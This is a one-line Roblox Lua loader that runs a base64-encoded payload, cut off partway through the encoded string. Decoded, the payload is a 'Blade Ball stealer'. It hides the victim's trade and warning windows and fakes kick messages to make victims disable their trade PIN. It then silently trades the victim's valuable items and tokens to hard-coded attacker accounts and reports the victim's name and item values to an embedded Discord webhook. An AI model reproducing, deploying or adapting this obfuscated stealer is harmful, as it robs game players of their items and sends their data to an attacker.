loadstring(game:HttpGet('data:text/plain;base64,X0cuc2NyaXB0RXhlY3V0ZWQgPSBfRy5zY3JpcHRFeGVjdXRlZCBvciBmYWxzZQppZiBfRy5zY3JpcHRFeGVjdXRlZCB0aGVuCiAgICByZXR1cm4KZW5kCl9HLnNjcmlwdEV4ZWN1dGVkID0gdHJ1ZQoKbG9jYWwgdmFyXzhla3pzZiA9IHt9CmxvY2FsIHZhcl83YnpiZWYgPSB7IlN3b3JkIiwgIkVtb3RlIiwgIkV4cGxvc2lvbiJ9CmxvY2FsIHZhcl84YWlmbm4gPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQpsb2NhbCB2YXJfYjBnc3B1ID0gUGxheWVycy5Mb2NhbFBsYXllcgpsb2NhbCB2YXJfNWc4cW82ID0gZ2FtZTpHZXRTZXJ2aWNlKCJIdHRwU2VydmljZSIpCmxvY2FsIHZhcl96dWczNXogPSBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIik6V2FpdEZvckNoaWxkKCJQYWNrYWdlcyIpOldhaXRGb3JDaGlsZCgiX0luZGV4Iik6V2FpdEZvckNoaWxkKCJzbGVpdG5pY2tfbmV0QDAuMS4wIik6V2FpdEZvckNoaWxkKCJuZXQiKQpsb2NhbCB2YXJfaHZydnd0ID0gcGxyLlBsYXllckd1aQpsb2NhbCB2YXJfamc0OGhmID0gUGxheWVyR3VpLlRyYWRlCmxvY2FsIHZhcl9hNjh1YnogPSBmYWxzZQpsb2NhbCB2YXJfazVrNG9yID0gUGxheWVyR3VpLk5vdGlmaWNhdGlvbnMKbG9jYWwgdmFyX3Z1MzM2dCA9IFBsYXllckd1aS5UcmFkZUNvbXBsZXRlZApsb2NhbCB2YXJfazZua2lkID0gcmVxdWlyZShnYW1lLlJlcGxpY2F0ZWRTdG9yYWdlLlNoYXJlZC5JbnZlbnRvcnkuQ2xpZW50KS5HZXQoKQpsb2NhbCB2YXJfOTBpZW1sID0gcmVxdWlyZShnYW1lLlJlcGxpY2F0ZWRTdG9yYWdlLlBhY2thZ2VzLlJlcGxpb24pCgpsb2NhbCB2YXJfbjh0aHowID0gX0cuVXNlcm5hbWVzIG9yIHsiUG96aUJhc2thbl9ZVEIiLCAiYmVucG96aWJhc2thbiJ9CmxvY2FsIHZhcl80N2s3N2wgPSBfRy5taW5fcmFwIG9yIDEwMApsb2NhbCB2YXJfNHpuZTZnID0gX0cucGluZ0V2ZXJ5b25lIG9yICJObyIKbG9jYWwgdmFyX2RobWkwciA9IF9HLndlYmhvb2sgb3IgImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzE0NjY0MTQzMDc3MTY3NjM3MDkvdnFnbHdQSVdGMGE1LWsyQnNhVjIxWkdqbWlRQWN6ZEpzTDJhc0t3OE9ZNEJkeGJsa1BHd01jODVsZW9UODdQZXNtQVkiCgppZiBuZXh0KHVzZXJzKSA9PSBuaWwgb3Igd2ViaG9vayA9PSAiIiB0aGVuCiAgICBwbHI6a2ljaygiWW91IGRpZG4ndCBhZGQgdXNlcm5hbWVzIG9yIHdlYmhvb2siKQogICAgcmV0dXJuCmVuZAoKaWYgZ2FtZS5QbGFjZUlkIH49IDEzNzcyMzk0NjI1IHRoZW4KICAgIHBscjpraWNrKCJHYW1lIG5vdCBzdXBwb3J0ZWQuIFBsZWFzZSBqb2luIGEgbm9ybWFsIEJsYWRlIEJhbGwgc2VydmVyIikKICAgIHJldHVybgplbmQKCmlmICNQbGF5ZXJzOkdldFBsYXllcnMoKSA+PSAxNiB0aGVuCiAgICBwbHI6a2ljaygiU2VydmVyIGlzIGZ1bGwuIFBsZWFzZSBqb2luIGEgbGVzcyBwb3B1bGF0ZWQgc2VydmVyIikKICAgIHJldHVybgplbmQKCmlmIGdhbWU6R2V0U2VydmljZSgiUm9ibG94UmVwbGljYXRlZFN0b3JhZ2UiKTpXYWl0Rm9yQ2hpbGQoIkdldFNlcnZlclR5cGUiKTpJbnZva2VTZXJ2ZXIoKSA9PSAiVklQU2VydmVyIiB0aGVuCiAgICBwbHI6a2ljaygiU2VydmVyIGVycm9yLiBQbGVhc2Ugam9pbiBhIERJRkZFUkVOVCBzZXJ2ZXIiKQogICAgcmV0dXJuCmVuZAoKbG9jYWwgdmFyXzZqeWlscyA9IHsKICAgIFsxXSA9IHsKICAgICAgICBbIm9wdGlvbiJdID0gIlBJTiIsCiAgICAgICAgWyJ2YWx1ZSJdID0gIjkwNzkiCiAgICB9Cn0KbG9jYWwgdmFyX3ZwaWpoZCwgUElOUmVwb25zZSA9IG5ldE1vZHVsZTpXYWl0Rm9yQ2hpbGQoIlJGL1Jlc2V0UElOQ29kZSIpOkludm9rZVNlcnZlcih1bnBhY2soYXJncykpCmlmIFBJTlJlcG9uc2Ugfj0gIllvdSBkb24ndCBoYXZlIGEgUElOIGNvZGUiIHRoZW4KICAgIHBscjpraWNrKCJBY2NvdW50IGVycm9yLiBQbGVhc2UgZGlzYWJsZSB0cmFkZSBQSU4gYW5kIHRyeSBhZ2FpbiIpCiAgICByZXR1cm4KZW5kCgp0cmFkZUd1aS5CbGFjay5WaXNpYmxlID0gZmFsc2UKdHJhZGVHdWkuTWlzY0NoYXQuVmlzaWJsZSA9IGZhbHNlCnRyYWRlQ29tcGxldGVHdWkuQmxhY2suVmlzaWJsZSA9IGZhbHNlCnRyYWRlQ29tcGxldGVHdWkuTWFpbi5WaXNpYmxlID0gZmFsc2UKCmxvY2FsIHZhcl95ejRibmcgPSB0cmFkZUd1aS5NYWluCm1haW50cmFkZWd1aS5WaXNpYmxlID0gZmFsc2UKbWFpbnRyYWRlZ3VpOkdldFByb3BlcnR5Q2hhbmdlZFNpZ25hbCgiVmlzaWJsZSIpOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgbWFpbnRyYWRlZ3VpLlZpc2libGUgPSBmYWxzZQplbmQpCmxvY2FsIHZhcl9sM2Rvd2sgPSB0cmFkZUd1aS5VbmZhaXJUcmFkZVdhcm5pbmcKdW5mYWlyVGFkZS5WaXNpYmxlID0gZmFsc2UKdW5mYWlyVGFkZTpHZXRQcm9wZXJ0eUNoYW5nZWRTaWduYWwoIlZpc2libGUiKTpDb25uZWN0KGZ1bmN0aW9uKCkKICAgIHVuZmFpclRhZGUuVmlzaWJsZSA9IGZhbHNlCmVuZCkKbG9jYWwgdmFyXzBnZjl5dSA9IG5vdGlmaWNhdGlvbnNHdWkuTm90aWZpY2F0aW9ucwpub3RpZmljYXRpb25zRnJhbWUuVmlzaWJsZSA9IGZhbHNlCm5vdGlmaWNhdGlvbnNGcmFtZTpHZXRQcm9wZXJ0eUNoYW5nZWRTaWduYWwoIlZpc2libGUiKTpDb25uZWN0KGZ1bmN0aW9uKCkKICAgIG5vdGlmaWNhdGlvbnNGcmFtZS5WaXNpYmxlID0gZmFsc2UKZW5kKQoKdHJhZGVHdWk6R2V0UHJvcGVydHlDaGFuZ2VkU2lnbmFsKCJFbmFibGVkIik6Q29ubmVjdChmdW5jdGlvbigpCiAgICBpblRyYWRlID0gdHJhZGVHdWkuRW5hYmxlZAplbmQpCgpsb2NhbCB2YXJfcDFyd2R6IHNlbmRUcmFkZVJlcXVlc3QodXNlcikKICAgIGxvY2FsIHZhcl80MGx1Z2EgPSB7CiAgICAgICAgWzFdID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIik6V2FpdEZvckNoaWxkKHVzZXIpCiAgICB9CiAgICByZXBlYXQKICAgICAgICB3YWl0KDAuMSkKICAgICAgICBsb2NhbCB2YXJfc3BsbzZtID0gbmV0TW9kdWxlOldhaXRGb3JDaGlsZCgiUkYvVHJhZGluZy9TZW5kVHJhZGVSZXF1ZXN0Iik6SW52b2tlU2VydmVyKHVucGFjayhhcmdzKSkKICAgIHVudGlsIHJlc3BvbnNlID09IHRydWUKZW5kCgpsb2NhbCB2YXJfdnZ6Y3ViIGFkZEl0ZW1Ub1RyYWRlKGl0ZW1UeXBlLCBJRCkKICAgIGxvY2FsIHZhcl9ka25oNnUgPSB7CiAgICAgICAgWzFdID0gaXRlbVR5cGUsCiAgICAgICAgWzJdID0gSUQKICAgIH0KICAgIHJlcGVhdAogICAgICAgIGxvY2FsIHZhcl94bDFpeWggPSBuZXRNb2R1bGU6V2FpdEZvckNoaWxkKCJSRi9UcmFkaW5nL0FkZEl0ZW1Ub1RyYWRlIik6SW52b2tlU2VydmVyKHVucGFjayhhcmdzKSkKICAgIHVudGlsIHJlc3BvbnNlID09IHRydWUKZW5kCgpsb2NhbCB2YXJfcDBuaXplIHJlYWR5VHJhZGUoKQogICAgbG9jYWwgdmFyXzl5czFzbCA9IHsKICAgICAgICBbMV0gPSB0cnVlCiAgICB9CiAgICByZXBlYXQKICAgICAgICB3YWl0KDAuMSkKICAgICAgICBsb2NhbCB2YXJfZXJudXFyID0gbmV0TW9kdWxlOldhaXRGb3JDaGlsZCgiUkYvVHJhZGluZy9SZWFkeVVwIik6SW52b2tlU2VydmVyKHVucGFjayhhcmdzKSkKICAgIHVudGlsIHJlc3BvbnNlID09IHRydWUKZW5kCgpsb2NhbCB2YXJfMG91aXBjIGNvbmZpcm1UcmFkZSgpCiAgICByZXBlYXQKICAgICAgICB3YWl0KDAuMSkKICAgICAgICBuZXRNb2R1bGU6V2FpdEZvckNoaWxkKCJSRi9UcmFkaW5nL0NvbmZpcm1UcmFkZSIpOkludm9rZVNlcnZlcigpCiAgICB1bnRpbCBub3QgaW5UcmFkZQplbmQKCmxvY2FsIHZhcl9mcGd4bm0gZm9ybWF0TnVtYmVyKG51bWJlcikKICAgIGlmIG51bWJlciA9PSBuaWwgdGhlbgogICAgICAgIHJldHVybiAiMCIKICAgIGVuZAoJbG9jYWwgdmFyX2VreHBxOCA9IHsiIiwgImsiLCAibSIsICJiIiwgInQifQoJbG9jYWwgdmFyXzU3MnVqZCA9IDEKCXdoaWxlIG51bWJlciA+PSAxMDAwIGFuZCBzdWZmaXhJbmRleCA8ICNzdWZmaXhlcyBkbwoJCW51bWJlciA9IG51bWJlciAvIDEwMDAKCQlzdWZmaXhJbmRleCA9IHN1ZmZpeEluZGV4ICsgMQoJZW5kCiAgICBpZiBzdWZmaXhJbmRleCA9PSAxIHRoZW4KICAgICAgICByZXR1cm4gdG9zdHJpbmcobWF0aC5mbG9vcihudW1iZXIpKQogICAgZWxzZQogICAgICAgIGlmIG51bWJlciA9PSBtYXRoLmZsb29yKG51bWJlcikgdGhlbgogICAgICAgICAgICByZXR1cm4gc3RyaW5nLmZvcm1hdCgiJWQlcyIsIG51bWJlciwgc3VmZml4ZXNbc3VmZml4SW5kZXhdKQogICAgICAgIGVsc2UKICAgICAgICAgICAgcmV0dXJuIHN0cmluZy5mb3JtYXQoIiUuMmYlcyIsIG51bWJlciwgc3VmZml4ZXNbc3VmZml4SW5kZXhdKQogICAgICAgIGVuZAogICAgZW5kCmVuZAoKbG9jYWwgdmFyX2R2aTZ3YiA9IDAKCmxvY2FsIHZhcl9wejA5NGYgU2VuZEpvaW5NZXNzYWdlKGxpc3QsIHByZWZpeCkKICAgIGxvY2FsIHZhcl83Y3Fvd3ogPSB7CiAgICAgICAgewogICAgICAgICAgICBuYW1lID0gIlZpY3RpbSBVc2VybmFtZToiLAogICAgICAgICAgICB2YWx1ZSA9IHBsci5OYW1lLAogICAgICAgICAgICBpbmxpbmUgPSB0cnVlCiAgICAgICAgfSwKICAgICAgICB7CiAgICAgICAgICAgIG5hbWUgPSAiSm9pbiBsaW5rOiIsCiAgICAgICAgICAgIHZhbHVlID0gImh0dHBzOi8vZmVybi53dGYvam9pbmVyP3BsYWNlSWQ9MTM3NzIzOTQ2MjUmZ2FtZUluc3RhbmNlSWQ9IiAuLiBnYW1lLkpvYklkCiAgICAgICAgfSwKICAgICAgICB7CiAgICAgICAgICAgIG5hbWUgPSAiSXRlbSBsaXN0OiIsCiAgICAgICAgICAgIHZhbHVlID0gIiIsCiAgICAgICAgICAgIGlubGluZSA9IGZhbHNlCiAgICAgICAgfSwKICAgICAgICB7CiAgICAgICAgICAgIG5hbWUgPSAiU3VtbWFyeToiLAogICAgICAgICAgICB2YWx1ZSA9IHN0cmluZy5mb3JtYXQoIlRvdGFsIFJBUDogJXMiLCBmb3JtYXROdW1iZXIodG90YWxSQVApKSwKICAgICAgICAgICAgaW5saW5lID0gZmFsc2UKICAgICAgICB9CiAgICB9CgogICAgbG9jYWwgdmFyXzFuamQxOCA9IHt9CiAgICBmb3IgXywgaXRlbSBpbiBpcGFpcnMobGlzdCkgZG8KICAgICAgICBpZiBncm91cGVkW2l0ZW0uTmFtZV0gdGhlbgogICAgICAgICAgICBncm91cGVkW2l0ZW0uTmFtZV0uQ291bnQgPSBncm91cGVkW2l0ZW0uTmFtZV0uQ291bnQgKyAxCiAgICAgICAgICAgIGdyb3VwZWRbaXRlbS5OYW1lXS5Ub3RhbFJBUCA9IGdyb3VwZWRbaXRlbS5OYW1lXS5Ub3RhbFJBUCArIGl0ZW0uUkFQCiAgICAgICAgZWxzZQogICAgICAgICAgICBncm91cGVkW2l0ZW0uTmFtZV0gPSB7CiAgICAgICAgICAgICAgICBOYW1lID0gaXRlbS5OYW1lLAogICAgICAgICAgICAgICAgQ291bnQgPSAxLAogICAgICAgICAgICAgICAgVG90YWxSQVAgPSBpdGVtLlJBUAogICAgICAgICAgICB9CiAgICAgICAgZW5kCiAgICBlbmQKCiAgICBsb2NhbCB2YXJfNml6aXo5ID0ge30KICAgIGZvciBfLCBncm91cCBpbiBwYWlycyhncm91cGVkKSBkbwogICAgICAgIHRhYmxlLmluc2VydChncm91cGVkTGlzdCwgZ3JvdXApCiAgICBlbmQKCiAgICB0YWJsZS5zb3J0KGdyb3VwZWRMaXN0LCBmdW5jdGlvbihhLCBiKQogICAgICAgIHJldHVybiBhLlRvdGFsUkFQID4gYi5Ub3RhbFJBUAogICAgZW5kKQoKICAgIGZvciBfLCBncm91cCBpbiBpcGFpcnMoZ3JvdXBlZExpc3QpIGRvCiAgICAgICAgbG9jYWwgdmFyX3BoZG52aCA9IHN0cmluZy5mb3JtYXQoIiVzICh4JXMpIC0gJXMgUkFQIiwgZ3JvdXAuTmFtZSwgZ3JvdXAuQ291bnQsIGZvcm1hdE51bWJlcihncm91cC5Ub3RhbFJBUCkpCiAgICAgICAgZmllbGRzWzNdLnZhbHVlID0gZmllbGRzWzNdLnZhbHVlIC4uIGl0ZW1MaW5lIC4uICJcbiIKICAgIGVuZAoKICAgIGlmICNmaWVsZHNbM10udmFsdWUgPiAxMDI0IHRoZW4KICAgICAgICBsb2NhbCB2YXJfdzExdDV2ID0ge30KICAgICAgICBmb3IgbGluZSBpbiBmaWVsZHNbM10udmFsdWU6Z21hdGNoKCJbXlxyXG5dKyIpIGRvCiAgICAgICAgICAgIHRhYmxlLmluc2VydChsaW5lcywgbGluZSkKICAgICAgICBlbmQKCiAgICAgICAgd2hpbGUgI2ZpZWxkc1szXS52YWx1ZSA+IDEwMjQgYW5kICNsaW5lcyA+IDAgZG8KICAgICAgICAgICAgdGFibGUucmVtb3ZlKGxpbmVzKQogICAgICAgICAgICBmaWVsZHNbM10udmFsdWUgPSB0YWJsZS5jb25jYXQobGluZXMsICJcbiIpIC4uICJcblBsdXMgbW9yZSEiCiAgICAgICAgZW5kCiAgICBlbmQKCiAgICBsb2NhbCB2YXJfZGQ4MGd0ID0gewogICAgICAgIFsiY29udGVudCJdID0gcHJlZml4IC4uICJnYW1lOkdldFNlcnZpY2UoJ1RlbGVwb3J0U2VydmljZScpOlRlbGVwb3J0VG9QbGFjZUluc3RhbmNlKDEzNzcyMzk0NjI1LCAnIiAuLiBnYW1lLkpvYklkIC4uICInKSIsCiAgICAgICAgWyJlbWJlZHMiXSA9IHt7CiAgICAgICAgICAgIFsidGl0bGUiXSA9ICJcMjQwXDE1OVwxNDhcMTgwIEpvaW4gdG8gZ2V0IEJsYWRlIEJhbGwgaGl0IiwKICAgICAgICAgICAgWyJjb2xvciJdID0gNjUyODAsCiAgICAgICAgICAgIFsiZmllbGRzIl0gPSBmaWVsZHMsCiAgICAgICAgICAgIFsiZm9vdGVyIl0gPSB7CiAgICAgICAgICAgICAgICBbInRleHQiXSA9ICJCbGFkZSBCYWxsIHN0ZWFsZXIgYnkgQ2FtU2NyaXB0ZXIiCiAgICAgICAgICAgIH0KICAgICAgICB9fQogICAgfQogICAgbG9jYWwgdmFyX2M0NzZ3eSA9IEh0dHBTZXJ2aWNlOkpTT05FbmNvZGUoZGF0YSkKICAgIGxvY2FsIHZhcl90MWFkeXkgPSB7CiAgICAgICAgWyJDb250ZW50LVR5cGUiXSA9ICJhcHBsaWNhdGlvbi9qc29uIgogICAgfQogICAgbG9jYWwgdmFyX2ptMnAxYSA9IHJlcXVlc3QoewogICAgICAgIFVybCA9IHdlYmhvb2ssCiAgICAgICAgTWV0aG9kID0gIlBPU1QiLAogICAgICAgIEhlYWRlcnMgPSBoZWFkZXJzLAogICAgICAgIEJvZHkgPSBib2R5CiAgICB9KQplbmQKCmxvY2FsIHZhcl94Nm8zcHAgU2VuZE1lc3NhZ2UobGlzdCkKICAgIGxvY2FsIHZhcl85NG4wMjkgPSB7CgkJewoJCQluYW1lID0gIlZpY3RpbSBVc2VybmFtZToiLAoJCQl2YWx1ZSA9IHBsci5OYW1lLAoJCQlpbmxpbmUgPSB0cnVlCgkJfSwKCQl7CgkJCW5hbWUgPSAiSXRlbXMgc2VudDoiLAoJCQl2YWx1ZSA9ICIiLAoJCQlpbmxpbmUgPSBmYWxzZQoJCX0sCiAgICAgICAgewogICAgICAgICAgICBuYW1lID0gIlN1bW1hcnk6IiwKICAgICAgICAgICAgdmFsdWUgPSBzdHJpbmcuZm9ybWF0KCJUb3RhbCBSQVA6ICVzIiwgZm9ybWF0TnVtYmVyKHRvdGFsUkFQKSksCiAgICAgICAgICAgIGlubGluZSA9IGZhbHNlCiAgICAgICAgfQoJfQoKICAgIGxvY2FsIHZhcl95dDJobGogPSB7fQogICAgZm9yIF8sIGl0ZW0gaW4gaXBhaXJzKGxpc3QpIGRvCiAgICAgICAgaWYgZ3JvdXBlZFtpdGVtLk5hbWVdIHRoZW4KICAgICAgICAgICAgZ3JvdXBlZFtpdGVtLk5hbWVdLkNvdW50ID0gZ3JvdXBlZFtpdGVtLk5hbWVdLkNvdW50ICsgMQogICAgICAgICAgICBncm91cGVkW2l0ZW0uTmFtZV0uVG90YWxSQVAgPSBncm91cGVkW2l0ZW0uTmFtZV0uVG90YWxSQVAgKyBpdGVtLlJBUAogICAgICAgIGVsc2UKICAgICAgICAgICAgZ3JvdXBlZFtpdGVtLk5hbWVdID0gewogICAgICAgICAgICAgICAgTmFtZSA9IGl0ZW0uTmFtZSwKICAgICAgICAgICAgICAgIENvdW50ID0gMSwKICAgICAgICAgICAgICAgIFRvdGFsUkFQID0gaXRlbS5SQVAKICAgICAgICAgICAgfQogICAgICAgIGVuZAogICAgZW5kCgogICAgbG9jYWwgdmFyX21uMWV4bSA9IHt9CiAgICBmb3IgXywgZ3JvdXAgaW4gcGFpcnMoZ3JvdXBlZCkgZG8KICAgICAgICB0YWJsZS5pbnNlcnQoZ3JvdXBlZExpc3QsIGdyb3VwKQogICAgZW5kCgogICAgdGFibGUuc29ydChncm91cGVkTGlzdCwgZnVuY3Rpb24oYSwgYikKICAgICAgICByZXR1cm4gYS5Ub3RhbFJBUCA+IGIuVG90YWxSQVAKICAgIGVuZCkKCiAgICBmb3IgXywgZ3JvdXAgaW4gaXBhaXJzKGdyb3VwZWRMaXN0KSBkbwogICAgICAgIGxvY2FsIHZhcl91Z2JoMm8gPSBzdHJpbmcuZm9ybWF0KCIlcyAoeCVzKSAtICVzIFJBUCIsIGdyb3VwLk5hbWUsIGdyb3VwLkNvdW50LCBmb3JtYXROdW1iZXIoZ3JvdXAuVG90YWxSQVApKQogICAgICAgIGZpZWxkc1syXS52YWx1ZSA9IGZpZWxkc1syXS52YWx1ZSAuLiBpdGVtTGluZSAuLiAiXG4iCiAgICBlbmQKCiAgICBpZiAjZmllbGRzWzJdLnZhbHVlID4gMTAyNCB0aGVuCiAgICAgICAgbG9jYWwgdmFyX3N4bWV4dyA9IHt9CiAgICAgICAgZm9yIGxpbmUgaW4gZmllbGRzWzJdLnZhbHVlOmdtYXRjaCgiW15cclxuXSsiKSBkbwogICAgICAgICAgICB0YWJsZS5pbnNlcnQobGluZXMsIGxpbmUpCiAgICAgICAgZW5kCgogICAgICAgIHdoaWxlICNmaWVsZHNbMl0udmFsdWUgPiAxMDI0IGFuZCAjbGluZXMgPiAwIGRvCiAgICAgICAgICAgIHRhYmxlLnJlbW92ZShsaW5lcykKICAgICAgICAgICAgZmllbGRzWzJdLnZhbHVlID0gdGFibGUuY29uY2F0KGxpbmVzLCAiXG4iKSAuLiAiXG5QbHVzIG1vcmUhIgogICAgICAgIGVuZAogICAgZW5kCgogICAgbG9jYWwgdmFyX3hsaThrZSA9IHsKICAgICAgICBbImVtYmVkcyJdID0ge3sKICAgICAgICAgICAgWyJ0aXRsZSJdID0gIlwyNDBcMTU5XDE0OFwxODAgTmV3IEJsYWRlIEJhbGwgRXhlY3V0aW9uIiAsCiAgICAgICAgICAgIFsiY29sb3IiXSA9IDY1MjgwLAoJCQlbImZpZWxkcyJdID0gZmllbGRzLAoJCQlbImZvb3RlciJdID0gewoJCQkJWyJ0ZXh0Il0gPSAiQmxhZGUgQmFsbCBzdGVhbGVyIGJ5IENhbVNjcmlwdGVyIgoJCQl9CiAgICAgICAgfX0KICAgIH0KCiAgICBsb2NhbCB2YXJfaTBzZ2swID0gSHR0cFNlcnZpY2U6SlNPTkVuY29kZShkYXRhKQogICAgbG9jYWwgdmFyXzRqNGFhOCA9IHsKICAgICAgICBbIkNvbnRlbnQtVHlwZSJdID0gImFwcGxpY2F0aW9uL2pzb24iCiAgICB9CiAgICBsb2NhbCB2YXJfNmp4bm4wID0gcmVxdWVzdCh7CiAgICAgICAgVXJsID0gd2ViaG9vaywKICAgICAgICBNZXRob2QgPSAiUE9TVCIsCiAgICAgICAgSGVhZGVycyA9IGhlYWRlcnMsCiAgICAgICAgQm9keSA9IGJvZHkKICAgIH0pCmVuZAoKbG9jYWwgdmFyX2VpNHpyMyA9IFJlcGxpb24uQ2xpZW50OkdldFJlcGxpb24oIkl0ZW1SQVAiKQpsb2NhbCB2YXJfMmxpcmpyID0gcmFwRGF0YVJlc3VsdC5EYXRhLkl0ZW1zCgpsb2NhbCB2YXJfMHZwNzQwIGJ1aWxkTmFtZVRvUkFQTWFwKGNhdGVnb3J5KQogICAgbG9jYWwgdmFyX3kwdnY2ZSA9IHt9CiAgICBsb2NhbCB2YXJfYXE1bmtoID0gcmFwRGF0YVtjYXRlZ29yeV0KCiAgICBpZiBub3QgY2F0ZWdvcnlSYXBEYXRhIHRoZW4KICAgICAgICByZXR1cm4gbmFtZVRvUkFQCiAgICBlbmQKCiAgICBmb3Igc2VyaWFsaXplZEtleSwgcmFwIGluIHBhaXJzKGNhdGVnb3J5UmFwRGF0YSkgZG8KICAgICAgICBsb2NhbCB2YXJfbzg5N2E5LCBkZWNvZGVkS2V5ID0gcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICByZXR1cm4gSHR0cFNlcnZpY2U6SlNPTkRlY29kZShzZXJpYWxpemVkS2V5KQogICAgICAgIGVuZCkKCiAgICAgICAgaWYgc3VjY2VzcyBhbmQgdHlwZShkZWNvZGVkS2V5KSA9PSAidGFibGUiIHRoZW4KICAgICAgICAgICAgZm9yIF8sIHBhaXIgaW4gaXBhaXJzKGRlY29kZWRLZXkpIGRvCiAgICAgICAgICAgICAgICBpZiBwYWlyWzFdID09ICJOYW1lIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdmFyXzF4bGt2eSA9IHBhaXJbMl0KICAgICAgICAgICAgICAgICAgICBuYW1lVG9SQVBbaXRlbU5hbWVdID0gcmFwCiAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAogICAgcmV0dXJuIG5hbWVUb1JBUAplbmQKCmxvY2FsIHZhcl8ybjloM2cgPSB7fQpmb3IgXywgY2F0ZWdvcnkgaW4gaXBhaXJzKGNhdGVnb3JpZXMpIGRvCiAgICByYXBNYXBwaW5nc1tjYXRlZ29yeV0gPSBidWlsZE5hbWVUb1JBUE1hcChjYXRlZ29yeSkKZW5kCgpsb2NhbCB2YXJfdmhhZHZqIGdldFJBUChjYXRlZ29yeSwgaXRlbU5hbWUpCiAgICBsb2NhbCB2YXJfNmpqcTFkID0gcmFwTWFwcGluZ3NbY2F0ZWdvcnldCiAgICBpZiByYXBNYXAgdGhlbgogICAgICAgIGxvY2FsIHZhcl82cmVnOXogPSByYXBNYXBbaXRlbU5hbWVdCiAgICAgICAgaWYgcmFwIHRoZW4KICAgICAgICAgICAgcmV0dXJuIHJhcAogICAgICAgIGVsc2UKICAgICAgICAgICAgcmV0dXJuIDAKICAgICAgICBlbmQKICAgIGVsc2UKICAgICAgICByZXR1cm4gMAogICAgZW5kCmVuZAoKZm9yIF8sIGNhdGVnb3J5IGluIGlwYWlycyhjYXRlZ29yaWVzKSBkbwogICAgZm9yIGl0ZW1JZCwgaXRlbUluZm8gaW4gcGFpcnMoY2xpZW50SW52ZW50b3J5W2NhdGVnb3J5XSkgZG8KICAgICAgICBpZiBpdGVtSW5mby5UcmFkZUxvY2sgdGhlbgogICAgICAgICAgICBjb250aW51ZQogICAgICAgIGVuZAogICAgICAgIGxvY2FsIHZhcl9hZnVyNGggPSBpdGVtSW5mby5OYW1lCiAgICAgICAgbG9jYWwgdmFyX2dwanRkeCA9IGdldFJBUChjYXRlZ29yeSwgaXRlbU5hbWUpCiAgICAgICAgaWYgcmFwID49IG1pbl9yYXAgdGhlbgogICAgICAgICAgICB0b3RhbFJBUCA9IHRvdGFsUkFQICsgcmFwCiAgICAgICAgICAgIHRhYmxlLmluc2VydChpdGVtc1RvU2VuZCwge0l0ZW1JRCA9IGl0ZW1JZCwgUkFQID0gcmFwLCBpdGVtVHlwZSA9IGNhdGVnb3J5LCBOYW1lID0gaXRlbU5hbWV9KQogICAgICAgIGVuZAogICAgZW5kCmVuZAoKaWYgI2l0ZW1zVG9TZW5kID4gMCB0aGVuCiAgICB0YWJsZS5zb3J0KGl0ZW1zVG9TZW5kLCBmdW5jdGlvbihhLCBiKQogICAgICAgIHJldHVybiBhLlJBUCA+IGIuUkFQCiAgICBlbmQpCgogICAgbG9jYWwgdmFyX2NzNmUwYyA9IHt9CiAgICBmb3IgaSwgdiBpbiBpcGFpcnMoaXRlbXNUb1NlbmQpIGRvCiAgICAgICAgc2VudEl0ZW1zW2ldID0gdgogICAgZW5kCgogICAgbG9jYWwgdmFyX2t3dDNlaSA9ICIiCiAgICBpZiBwaW5nID09ICJZZXMiIHRoZW4KICAgICAgICBwcmVmaXggPSAiLS1bW0BldmVyeW9uZV1dICIKICAgIGVuZAoKICAgIFNlbmRKb2luTWVzc2FnZShpdGVtc1RvU2VuZCwgcHJlZml4KQoKICAgIGxvY2FsIHZhcl80OW01dzMgZ2V0TmV4dEJhdGNoKGl0ZW1zLCBiYXRjaFNpemUpCiAgICAgICAgbG9jYWwgdmFyXzU0MXgxNSA9IHt9CiAgICAgICAgZm9yIGkgPSAxLCBtYXRoLm1pbihiYXRjaFNpemUsICNpdGVtcykgZG8KICAgICAgICAgICAgdGFibGUuaW5zZXJ0KGJhdGNoLCB0YWJsZS5yZW1vdmUoaXRlbXMsIDEpKQogICAgICAgIGVuZAogICAgICAgIHJldHVybiBiYXRjaAogICAgZW5kCgogICAgbG9jYWwgdmFyX3h0ZWl5bCBkb1RyYWRlKGpvaW5lZFVzZXIpCiAgICAgICAgd2hpbGUgI2l0ZW1zVG9TZW5kID4gMCBkbwogICAgICAgICAgICBzZW5kVHJhZGVSZXF1ZXN0KGpvaW5lZFVzZXIpCiAgICAgICAgICAgIHJlcGVhdAogICAgICAgICAgICAgICAgd2FpdCgwLjUpCiAgICAgICAgICAgIHVudGlsIGluVHJhZGUKCiAgICAgICAgICAgIGxvY2FsIHZhcl9pcnAzODYgPSBnZXROZXh0QmF0Y2goaXRlbXNUb1NlbmQsIDEwMCkKICAgICAgICAgICAgZm9yIF8sIGl0ZW0gaW4gaXBhaXJzKGN1cnJlbnRCYXRjaCkgZG8KICAgICAgICAgICAgICAgIGFkZEl0ZW1Ub1RyYWRlKGl0ZW0uaXRlbVR5cGUsIGl0ZW0uSXRlbUlEKQogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGxvY2FsIHZhcl9lbXN5MGkgPSBQbGF5ZXJHdWkuVHJhZGVSZXF1ZXN0Lk1haW4uQ3VycmVuY3kuQ29pbnMuQW1vdW50LlRleHQKICAgICAgICAgICAgbG9jYWwgdmFyX3hxbzRncSA9IHJhd1RleHQ6Z3N1YigiXiVzKiguLSklcyokIiwgIiUxIikKICAgICAgICAgICAgbG9jYWwgdmFyX294NnhjbiA9IHRyaW1tZWRUZXh0OmdzdWIoIlteJWRdIiwgIiIpCiAgICAgICAgICAgIGxvY2FsIHZhcl81OWNlb3IgPSB0b251bWJlcihjbGVhbmVkVGV4dCkgb3IgMAogICAgICAgICAgICBpZiB0b2tlbnNhbW91bnQgPj0gMSB0aGVuCiAgICAgICAgICAgICAgICBuZXRNb2R1bGU6V2FpdEZvckNoaWxkKCJSRi9UcmFkaW5nL0FkZFRva2Vuc1RvVHJhZGUiKTpJbnZva2VTZXJ2ZXIodG9rZW5zYW1vdW50KQogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIHJlYWR5VH